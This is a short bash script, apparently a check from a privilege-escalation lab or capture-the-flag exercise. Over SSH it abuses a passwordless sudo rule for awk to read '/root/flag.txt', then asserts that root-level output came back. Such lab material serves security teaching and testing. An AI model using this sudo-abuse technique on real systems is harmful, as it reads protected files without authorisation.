#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run 'sudo -n /usr/bin/awk '\''BEGIN{while((getline line < "/root/flag.txt")>0) print line}'\')"
assert_root_output "${out}"
